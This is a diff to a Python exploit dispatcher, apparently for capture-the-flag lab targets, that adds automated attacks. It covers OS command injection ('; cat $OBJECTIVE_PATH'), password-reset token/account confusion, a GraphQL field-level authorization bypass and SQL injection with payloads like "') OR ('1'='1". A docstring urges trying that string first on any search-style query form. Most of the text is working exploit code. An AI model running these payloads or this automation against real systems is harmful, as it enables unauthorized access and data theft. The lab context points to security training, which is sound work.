@@ -19,9 +19,17 @@ oracle), and never edit this shared tree from a worker's job.
 Mastery is cumulative: a target's bug class is never assumed from the challenge's
 own name. `classify_and_recover` tries each recognized class in the evidence-led
 order below (same order the restored day-19/day-20 dispatcher used, extended with
-the three classes day-21 added, the one day-22 added, and the two day-24 added)
-and returns `None` if a target's evidence does not match anything known yet -
-that is a real signal for a new class, not a bug in this dispatcher.
+the three classes day-21 added, the one day-22 added, the two day-24 added, and
+the three day-25 added) and returns `None` if a target's evidence does not match
+anything known yet - that is a real signal for a new class, not a bug in this
+dispatcher.
+
+`rec_sqli_group_close` promotes a payload that has now worked, verbatim and
+unmodified, against five independent live apps across three release days
+(day-19's own sqli/solve.py, day-24's fetch-quest mastery, and three of
+day-25's mastery targets) - always try this exact string first against any
+`/search`-, `/lookup`-, or `/explore`-style `?q=` surface before any other
+injection form.
 """
 import json
 import re
@@ -373,6 +381,113 @@ def rec_field_action_bypass(t, clues):
     return None
 
 
+def rec_command_injection(t, clues):
+    """`/api/clues` -> feature_route + input_parameter + example_path (a Gin app
+    that shells out, unescaped, to build a directory listing from the raw
+    parameter value - the normal response is an `ls -l`-shaped stdout). Appending
+    `; <cmd>` to the parameter value runs `<cmd>` as a second shell statement and
+    concatenates its stdout into the response. `$(...)` command substitution is
+    rejected server-side with `{"error":"diagnostic_failed"}` on every target seen
+    - only plain `;`-chaining works. The proof is never reflected by the base
+    command; the container's own `OBJECTIVE_PATH` env var (itself only visible via
+    an `env` injection) names the file that holds it.
+    Source: day-16-shell-company (curriculum day 16, release day 25) - this
+    family's own bug ('Shell Company' Gin app)."""
+    feature = clues.get("feature_route")
+    param = clues.get("input_parameter", "path")
+    example = clues.get("example_path", "/app/static")
+    if not feature:
+        return None
+    suffix = "; cat $OBJECTIVE_PATH 2>/dev/null || cat /run/huntress/objective.txt"
+    status, body = t.get(feature + "?" + urllib.parse.urlencode({param: example + suffix}), save="cmdi")
+    match = PROOF_RE.search(body)
+    return match.group(0) if match else None
+
+
+def rec_reset_account_confusion(t, clues):
+    """`/api/clues` -> feature_route (request a password-reset token) + secondary_route
+    (redeem a token to complete recovery) + recovery_guide_route (discloses the exact
+    account_parameter/token_parameter names and the account ids in play, each flagged
+    self_service true/false - no guessing needed). feature_route correctly refuses to
+    issue a token for a non-self-service account, but secondary_route never binds the
+    redeemed token to the account_id it is redeemed against: request a token for a
+    self-service account, then redeem that same token while claiming a different
+    (non-self-service) account id.
+    Source: day-17-reset-expectations (curriculum day 17, release day 25) - this
+    family's own bug (Symfony app)."""
+    feature, secondary = clues.get("feature_route"), clues.get("secondary_route")
+    guide_route = clues.get("recovery_guide_route")
+    if not feature or not secondary or not guide_route:
+        return None
+    status, guide = t.get_json(guide_route, save="recovery_guide")
+    if status != 200 or not guide:
+        return None
+    account_param = guide.get("account_parameter", "account_id")
+    token_param = guide.get("token_parameter", "token")
+    accounts = guide.get("accounts", [])
+    self_ids = [a["id"] for a in accounts if a.get("self_service")]
+    other_ids = [a["id"] for a in accounts if not a.get("self_service")]
+    for self_id in self_ids:
+        status, issued = t.get_json(f"{feature}?{urllib.parse.urlencode({account_param: self_id})}",
+                                     save=f"request_{self_id}")
+        token = (issued or {}).get("token")
+        if status != 200 or not token:
+            continue
+        for other_id in other_ids:
+            query = urllib.parse.urlencode({token_param: token, account_param: other_id})
+            status, redeemed = t.get_json(f"{secondary}?{query}", save=f"redeem_{self_id}_as_{other_id}")
+            if status == 200 and isinstance(redeemed, dict):
+                match = PROOF_RE.search(json.dumps(redeemed))
+                if match:
+                    return match.group(0)
+    return None
+
+
+def rec_graphql_field_bypass(t, clues):
+    """`/api/clues` -> feature_route (a live GraphQL endpoint: POST, JSON body
+    {"query": ...}) + protected_reference (an id hidden from the list query's
+    sensitive field). Authorization is enforced by omission on the list surface
+    (e.g. `caseIndex`, which never returns the sensitive field at all) but the
+    matching single-object surface (e.g. `case(id)`) has no field-level check
+    whatsoever - query it directly for protected_reference. Needs a browser-like
+    User-Agent (Target's default UA) - a bare urllib UA gets 403'd by the edge WAF
+    on this app.
+    Source: day-18-resolver-revolt (curriculum day 18, release day 25) - this
+    family's own bug (GraphQL.js 'Graph Garden')."""
+    feature = clues.get("feature_route")
+    protected_id = clues.get("protected_reference")
+    if not feature or protected_id is None:
+        return None
+    status, obj = t.post_json(
+        feature, {"query": 'query { case(id: "%s") { id title note } }' % protected_id}, save="graphql_case")
+    note = ((obj or {}).get("data") or {}).get("case", {}).get("note", "")
+    match = PROOF_RE.search(note)
+    return match.group(0) if match else None
+
+
+def rec_sqli_group_close(t, html):
+    """A `/search`-, `/lookup`-, or `/explore`-style `?q=` form backed by an
+    already-quoted LIKE clause (`WHERE (visible = 1 AND note LIKE '%<q>%')` shape).
+    The group-closing boolean payload `') OR ('1'='1` turns the WHERE true for
+    every row and surfaces the hidden/restricted record. Comment-based (`--`, `#`)
+    and plain `' OR '1'='1` payloads do NOT work against this app shape - the
+    group-closing form is tried first and has been sufficient on every confirmed
+    target so far; the others are kept only as a fallback.
+    Source: day-19-web-exploitation/sqli (curriculum day 19); reconfirmed verbatim,
+    unmodified, against five independent live apps across day-24's fetch-quest
+    mastery and three of day-25's mastery targets (Archive Atlas, Search Party x2)."""
+    action_match = re.search(r"<form[^>]*action=['\"]([^'\"]+)['\"]", html)
+    name_match = re.search(r"<input[^>]*name=['\"]([^'\"]+)['\"]", html)
+    action = action_match.group(1) if action_match else "/search"
+    name = name_match.group(1) if name_match else "q"
+    for i, payload in enumerate(("') OR ('1'='1", "%' OR '1'='1", "') OR ('1'='1'-- -", "' OR '1'='1")):
+        status, body = t.get(f"{action}?{urllib.parse.urlencode({name: payload})}", save=f"sqli_{i}")
+        match = PROOF_RE.search(body)
+        if match:
+            return match.group(0)
+    return None
+
+
 def classify_and_recover(t, evidence=None):
     """Evidence-led dispatcher: GET / once, then try each recognized class in order.
 
@@ -406,6 +521,16 @@ def classify_and_recover(t, evidence=None):
             proof = rec_reflect_callback(t, clues)
             if proof:
                 return proof
+        if clues.get("feature_route") and clues.get("input_parameter") and "example_path" in clues:
+            evidence["classification"] = "OS command injection"
+            proof = rec_command_injection(t, clues)
+            if proof:
+                return proof
+        if clues.get("recovery_guide_route") and clues.get("feature_route") and clues.get("secondary_route"):
+            evidence["classification"] = "password-reset token / account-id confusion"
+            proof = rec_reset_account_confusion(t, clues)
+            if proof:
+                return proof
         if clues.get("feature_route") and clues.get("secondary_route") and "inventory_route" not in clues:
             evidence["classification"] = "SSRF (fetch proxy to internal-only route)"
             proof = rec_ssrf(t, clues)
@@ -414,6 +539,12 @@ def classify_and_recover(t, evidence=None):
         if clues.get("feature_route") and clues.get("inventory_route") and "protected_reference" in clues:
             evidence["classification"] = "field/action authorization bypass"
             proof = rec_field_action_bypass(t, clues)
+            if proof:
+                return proof
+        if clues.get("feature_route") and clues.get("protected_reference") is not None \
+                and "inventory_route" not in clues and "secondary_route" not in clues:
+            evidence["classification"] = "GraphQL field-level authorization bypass"
+            proof = rec_graphql_field_bypass(t, clues)
             if proof:
                 return proof
         if clues.get("moderator_data_route") and clues.get("receipt_route_template"):
@@ -438,13 +569,24 @@ def classify_and_recover(t, evidence=None):
         if proof:
             return proof
 
+    if re.search(r'<form[^>]*action=[\'"][^\'"]*(search|lookup|explore)', html, re.I):
+        evidence["classification"] = "SQL injection (group-closing boolean)"
+        proof = rec_sqli_group_close(t, html)
+        if proof:
+            return proof
+
     if re.search(r"crawler polic|robots", html, re.I):
         evidence["classification"] = "backup exposure"
         proof = rec_backup(t)
         if proof:
             return proof
 
-    # last resort: try backup exposure even without the comment hint, as the day-08
-    # mastery dispatcher did.
+    # last resorts, in case the html-based gates above missed a signal (as the
+    # day-08 mastery dispatcher's backup-exposure fallback did, extended with sqli).
+    if "<form" in html:
+        proof = rec_sqli_group_close(t, html)
+        if proof:
+            evidence["classification"] = "SQL injection (group-closing boolean, fallback)"
+            return proof
     evidence.setdefault("classification", "unclassified; tried backup exposure as a last resort")
     return rec_backup(t)
